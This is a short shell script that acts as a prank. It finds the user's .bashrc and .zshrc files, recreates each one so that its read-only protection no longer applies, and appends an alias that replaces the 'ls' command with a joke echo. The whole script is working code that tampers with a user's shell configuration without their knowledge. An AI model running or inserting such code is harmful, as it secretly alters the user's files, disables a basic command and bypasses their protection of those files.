#!/bin/sh

set -e

dotfiles=".bashrc .zshrc"


write_rc_file() {
  local path="$1"

  echo "alias ls='echo caca'" >> "$path"
}

handle_protected_file()
{
  local path="$1"
  cat "$path" > "$path"2
  rm "$path"
  mv "$path"2 "$path"
}

for file in $dotfiles; do
  path=$(find ~/ -name "$file" | head -n1)
  if [ -z "$path" ]; then continue; fi

  handle_protected_file "$path"
  write_rc_file "$path"
done

